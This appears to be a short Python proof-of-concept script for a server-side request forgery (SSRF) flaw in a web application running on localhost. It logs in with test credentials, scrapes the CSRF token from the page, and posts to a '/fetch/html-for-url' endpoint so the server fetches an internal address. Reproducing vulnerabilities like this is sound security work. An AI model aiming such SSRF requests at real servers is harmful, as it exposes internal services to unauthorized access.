import requests


SERVER_URL = 'http://localhost:12380'
EMAIL = 'test@example.com'
PASSWORD = '1234567890'


if __name__ == '__main__':
    session = requests.Session()
    login_url = f"{SERVER_URL}/login"
    login_page_response = session.get(login_url)
    # content="{&quot;user&quot;:{&quot;token&quot;:&quot;GZKiyGmENImFN670vWscxOcgyGV8VvOsjaBWX0Or&quot;}
    token = login_page_response.text.split('content="{&quot;user&quot;:{&quot;token&quot;:&quot;')[1].split('&quot;}')[0]

    login_data = {
        "email": EMAIL,
        "password": PASSWORD,
        "_token": token,
        "remember_me": "0"
    }
    login_response = session.post(login_url, data=login_data, allow_redirects=True)
    token = login_response.text.split('content="{&quot;user&quot;:{&quot;token&quot;:&quot;')[1].split('&quot;}')[0]
    print(token)

    # Trigger SSRF
    api_url = f"{SERVER_URL}/fetch/html-for-url"
    data = {
        "_token": token,
        "url": "http://localhost:8080"
    }
    response = session.post(api_url, data=data, allow_redirects=True)
    print("Response text:")
    print(response.text)